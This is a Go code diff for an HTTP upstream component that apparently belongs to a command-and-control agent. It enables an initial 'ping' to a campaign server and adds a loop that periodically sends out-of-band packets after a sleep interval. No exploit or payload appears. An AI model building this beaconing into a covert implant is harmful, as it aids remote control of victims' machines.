@@ -54,16 +54,19 @@ func (d *UpstreamHttp) Connect() error {
 
 	//// TODO: IMPLEMENT HTTP PING CHECK
 
-	/*
-		arguments := make(model.PacketArgument)
-		response := make(model.PacketResponse)
-		packet := model.NewPacket("ping", d.config.ComputerId, "0", arguments, response)
-		err := d.SendOutofband(packet)
-		if err != nil {
-			log.Warnf("Initial test ping: Could not reach server %s (yet, i keep trying...)", d.campaign.ServerUrl)
-		}*/
+	arguments := make(model.PacketArgument)
+	response := make(model.PacketResponse)
+	packet := model.NewPacket("ping", d.config.ComputerId, "0", arguments, response)
+	err := d.SendOutofband(packet)
+	if err != nil {
+		log.Warnf("Initial test ping: Could not reach server %s (yet, i keep trying...)", d.campaign.ServerUrl)
+	}
 
 	return nil
+}
+
+func (d *UpstreamHttp) Connected() bool {
+	return true
 }
 
 func (d *UpstreamHttp) Channel() chan model.Packet {
@@ -108,7 +111,7 @@ func (d *UpstreamHttp) Start() {
 			d.channel <- packet
 
 			// Receive answer from Client
-			packet = <-d.channel
+			packet = <-d.channel // oobChannel?
 
 			// Send answer back to server
 			err = d.sendPacket(packet)
@@ -120,6 +123,23 @@ func (d *UpstreamHttp) Start() {
 			}
 		}
 
+	}()
+
+	go func() {
+		for {
+			time.Sleep(d.state.getSleepDuration())
+
+			packet := <-d.oobChannel
+
+			// Send answer to server
+			err := d.sendPacket(packet)
+			if err != nil {
+				log.WithFields(log.Fields{
+					"packet": packet,
+					"error":  err,
+				}).Info("Error sending packet")
+			}
+		}
 	}()
 }
 
